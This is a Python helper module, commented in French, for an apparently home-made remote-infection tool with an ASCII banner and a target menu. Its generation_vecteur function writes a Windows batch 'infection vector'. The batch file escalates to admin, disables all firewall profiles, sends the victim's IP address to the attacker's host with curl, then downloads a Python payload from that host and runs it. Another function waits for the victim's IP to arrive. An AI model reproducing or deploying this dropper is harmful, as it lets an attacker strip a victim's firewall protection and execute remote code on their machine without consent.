"""
Author: Martin Calamel
Created: 2025-02-26
Description: fichier avec toutes les fonctions utiles pour les fichiers qui ne serons pas envoyer.
TODO: 
"""

# importation des modules
import socket
import os
from colorama import Fore
from modules.info import Info
import csv
import time



def get_self_ip() -> str:
    """
    # get_ip
    ## Presentation
    Fonction pour déterminer l’**adresse IP de la machine**
    ## Fonctionnement
    Via un socket on se connecte a internet `(8.8.8.8)` et on regarde l'adresse de la connection.  
    Par default si aucune adresse n'est trouver on affiche un message d'erreur  
    et l'adresse hôte retourner est celle du *localhost*
    ## Entrées
    Aucune entrées
    ## Sortie
    * HOST : str, adresse IP de l'hôte
    """
    try:
        s : socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        host : str = s.getsockname()[0]
        s.close()
        Info.valide(f"Adresse IP de l'hôte : {host}")
    except:
        Info.erreur("Vous n'êtes pas connecter a internet\n    -> Attribution de l'adresse IP localhost : 127.0.0.1")
        host : str = "127.0.0.1"
    return host



def menu() -> None:
    """
    Fonction pour afficher le Menu du début
    """
    print()
    print(Fore.RED)
    print("███████         ███████ ██ ██████  ███████ ████████ \n   ███          ██      ██ ██   ██ ██         ██    \n  ███           █████   ██ ██████  ███████    ██    \n ███            ██      ██ ██   ██      ██    ██    \n███████ ███████ ██      ██ ██   ██ ███████    ██    \n",Fore.WHITE)
    print()
    print(Fore.GREEN,"              coded By macalamel",Fore.WHITE)
    print()
    print(Fore.BLUE,"Nouvelle cible    [1]")
    print("Ancienne cible    [2]")
    choix=input(">>> ")
    print(Fore.WHITE)
    return choix


def generation_vecteur(host : str, output : str = "payload") -> None:
    """
    # generation_vecteur
    ## Presentation
    Fonction pour générer le vecteur d'infection
    ## Fonctionnement
    * Suppression si il existe du vecteur
    * Création du nouveau fichier
    * Écriture du vecteur
    * Fermeture du fichier
    * Message de validation
    ## Entrées
    * host : str, adresse IP de l'hôte
    * output : str, Nom du fichier
    ## Sorties
    Aucunes sorties
    """
    os.system(f"del {output}.bat")
    fich=open(f'{output}.bat','w')
    msg=f"@echo off\nnet session >nul 2>&1\nif %errorLevel% neq 0 (\npowershell -Command \"Start-Process cmd -ArgumentList '/c \\\"%~fnx0\\\"' -Verb RunAs\"\nexit /b\n)\nNetSh Advfirewall set allprofiles state off\n(for /F \"tokens=16\" %%i in (\'\"ipconfig | findstr IPv4\"\') do (curl -d %%i http://{host}:8888/))\ncurl http://{host}:8000/payload/jeu.pyw -o jeu.py\npython jeu.py"
    fich.write(msg)
    fich.close()
    Info.valide(f"Vecteur crée avec le nom : {output}.bat")
    return None

def save_ip(host) -> None:
    """
    # save_ip
    ## Presentation
    Fonction pour entregistrer l'adresse IP de l'hôte dans un fichier texte
    ## Fonctionnement
    * Ouvre le fichier `selfIp.txt`
    * Remplace le contenue par `host`
    * Ferme le fichier
    ## Entrées
    * host : str, Adresse IP de l'hôte
    ## Sorties
    Aucune sortie
    """
    fich=open('selfIp.txt','w')
    fich.write(host)
    fich.close()

def read_victime_ip() -> str:
    """
    # read_victime_ip
    ## Presentation
    Fonction pour lire l'adresse IP de la victime.
    ## Fonctionnement
    * On supprime le contenue du fichier `message.txt`
    * On attend qu'il y a du contenue dans le fichier `message.txt`
    * On stock le premier élément dans une variable
    * On attend 1s
    * On revérifie la valeur 
    * On retourne le premier élément qui est l'adresse IP de la victime
    ## Entrées
    Aucune entrée
    ## Sorties
    victime_ip : str, adresse IP de la victime
    """
    ip_buffer = ""
    ip_victime = None
    donnees=[]
    while ip_buffer != ip_victime:
        ip_buffer = ip_victime
        while donnees==[]:
            fich=open('txt_files/message.txt','r')
            contenue = csv.reader(fich,delimiter=';')
            donnees=[]
            for ligne in contenue:
                donnees.append(ligne)
                print(ligne)
            fich.close()
        ip_victime : str = donnees[0][0]
        time.sleep(10)
    Info.valide(f"IP de la victime trouvé : {ip_victime}")
    return ip_victime